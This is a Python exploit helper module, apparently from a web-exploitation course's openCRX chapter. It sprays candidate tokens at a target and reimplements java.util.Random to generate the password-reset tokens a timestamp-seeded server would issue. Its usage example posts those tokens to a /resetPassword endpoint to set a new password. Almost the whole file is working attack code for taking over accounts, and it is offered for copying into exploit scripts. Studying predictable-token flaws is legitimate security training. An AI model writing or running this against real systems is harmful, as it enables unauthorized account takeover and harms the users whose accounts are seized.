#!/usr/bin/env python3
"""
Token brute-forcer — sequentially spray a list of candidate tokens against a target endpoint.

Use this when you can predict or enumerate tokens (e.g. non-random PRNG, timestamp-seeded,
short token space). Provide the token list and a submit function; this module handles the
spray loop, progress printing, and early exit.

Inspired by the openCRX chapter (non-random Java.util.Random password reset tokens).

Usage (copy spray_tokens into your exploit script):

    def try_token(token: str) -> bool:
        r = session.post(TARGET + "/resetPassword", data={
            "token": token, "password1": new_pass, "password2": new_pass
        })
        return "success" in r.text.lower()

    # Provide pre-generated token list (e.g. from JavaRandom, timestamp range, wordlist)
    winner = spray_tokens(token_list, try_token, label="password reset token")
    if winner:
        print(f"  [+] Valid token: {winner}")
"""

import sys
import time

# ==============================================================================
# TOKEN SPRAY
# ==============================================================================

def spray_tokens(
    token_list: list[str],
    submit_fn,
    label: str = "token",
    delay: float = 0.0,
) -> str | None:
    """
    Spray a list of candidate tokens sequentially and return the first that succeeds.

    Args:
        token_list : List of candidate tokens to try (ordered by likelihood).
        submit_fn  : callable(token: str) -> bool
                     Return True if the token is valid / accepted by the target.
        label      : Display label shown in the progress line.
        delay      : Optional sleep between requests (seconds). Default: 0.
                     Use a small value (e.g. 0.05) if the target rate-limits.

    Returns:
        The winning token string, or None if none matched.
    """
    total = len(token_list)

    for idx, token in enumerate(token_list, start=1):
        print(f"\r  [*] Spraying {label} {idx}/{total}: {token.strip()}", end="", flush=True)

        if submit_fn(token):
            print()  # newline after progress line
            return token

        if delay:
            time.sleep(delay)

    print()  # newline after progress line
    return None


# ==============================================================================
# JAVA UTIL RANDOM TOKEN GENERATOR
# (used in openCRX chapter — non-random password reset tokens)
# ==============================================================================

class JavaRandom:
    """
    Pure-Python reimplementation of java.util.Random.

    Matches the LCG parameters exactly:
        seed = (seed * 0x5DEECE66D + 0xB) & ((1 << 48) - 1)
        nextInt(n) returns seed >> (48 - bits)
    """
    MULTIPLIER = 0x5DEECE66D
    ADDEND     = 0xB
    MASK       = (1 << 48) - 1

    def __init__(self, seed: int):
        self._seed = (seed ^ self.MULTIPLIER) & self.MASK

    def _next(self, bits: int) -> int:
        self._seed = (self._seed * self.MULTIPLIER + self.ADDEND) & self.MASK
        return self._seed >> (48 - bits)

    def next_int(self, n: int) -> int:
        if (n & -n) == n:  # power-of-two fast path
            return (n * self._next(31)) >> 31
        while True:
            bits = self._next(31)
            val  = bits % n
            if ((bits - val + (n - 1)) & 0xFFFFFFFF) < 0x80000000:
                return val


# Alphabet used by openCRX token generation (matches source exactly)
_BASE62 = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"


def generate_java_random_tokens(
    start_seed: int,
    end_seed: int,
    token_length: int = 40,
    alphabet: str = _BASE62,
) -> list[str]:
    """
    Generate all tokens that java.util.Random would produce in [start_seed, end_seed).

    Args:
        start_seed   : Inclusive lower bound (Unix milliseconds).
        end_seed     : Exclusive upper bound (Unix milliseconds).
        token_length : Number of characters per token (openCRX uses 40).
        alphabet     : Character set used to map nextInt() output.

    Returns:
        List of candidate token strings ordered by seed value.

    Typical call site:
        # Measure the server clock window around the password reset request:
        t0 = int(time.time() * 1000)
        r = session.post(TARGET + "/resetPassword", data={"id": username})
        t1 = int(time.time() * 1000)
        tokens = generate_java_random_tokens(t0 - 1000, t1 + 1000)
    """
    tokens = []
    n = len(alphabet)
    for seed in range(start_seed, end_seed):
        rng = JavaRandom(seed)
        token = "".join(alphabet[rng.next_int(n)] for _ in range(token_length))
        tokens.append(token)
    return tokens


# ==============================================================================
# STANDALONE DEMO
# ==============================================================================

if __name__ == "__main__":
    print("token_bruteforce.py — import spray_tokens() and (optionally) generate_java_random_tokens().")
    print()
    print("Quick demo (spraying a small list):")

    TARGET_TOKEN = "abc123XYZ"
    candidates = ["wrong1", "wrong2", TARGET_TOKEN, "wrong3"]

    def demo_submit(token: str) -> bool:
        return token == TARGET_TOKEN

    winner = spray_tokens(candidates, demo_submit, label="demo token")
    print(f"  [+] Winner: {winner}")
    assert winner == TARGET_TOKEN
    print("  [+] Demo passed.")
